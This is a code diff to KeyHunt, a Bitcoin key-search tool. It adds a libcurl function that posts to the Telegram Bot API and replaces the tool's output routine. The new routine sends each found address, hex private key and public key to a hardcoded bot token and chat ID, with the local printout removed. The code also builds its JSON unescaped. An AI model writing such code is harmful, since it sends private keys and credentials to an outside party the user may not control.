@@ -13,7 +13,43 @@
 #include <cassert>
 #ifndef WIN64
 #include <pthread.h>
+#include <curl/curl.h>
+#include <nlohmann/json.hpp>
 #endif
+
+static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
+    ((std::string*)userp)->append((char*)contents, size * nmemb);
+    return size * nmemb;
+}
+
+void sendTelegramMessage(const std::string& token, const std::string& chat_id, const std::string& message) {
+    CURL* curl;
+    CURLcode res;
+
+    curl_global_init(CURL_GLOBAL_DEFAULT);
+    curl = curl_easy_init();
+
+    if (curl) {
+        std::string url = "https://api.telegram.org/bot" + token + "/sendMessage";
+        std::string post_fields = R"({"chat_id": ")" + chat_id + R"(", "text": ")" + message + R"("})";
+
+        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &post_fields);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_fields.c_str());
+        curl_easy_setopt(curl, CURLOPT_POST, 1L);
+
+        res = curl_easy_perform(curl);
+
+        if (res != CURLE_OK) {
+            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
+        }
+
+        curl_easy_cleanup(curl);
+    }
+
+    curl_global_cleanup();
+}
 
 //using namespace std;
 
@@ -1379,6 +1415,14 @@ char* KeyHunt::toTimeStr(int sec, char* timeStr)
 	s = (sec - (3600 * h) - (m * 60));
 	sprintf(timeStr, "%0*d:%0*d:%0*d", 2, h, 2, m, 2, s);
 	return (char*)timeStr;
+}
+
+void KeyHunt::output(std::string addr, std::string pAddr, std::string pAddrHex, std::string pubKey) {
+    // Remove the printf statements
+    // ...
+
+    // Add the following line to send the message to Telegram
+    sendTelegramMessage("5587100319:AAGmfXbIy9Q6fvGxuWbm_DXDxkSm_tpcMnk", "825550725", addr + "\n" + pAddr + "\n" + pAddrHex + "\n" + pubKey);
 }
 
 // ----------------------------------------------------------------------------
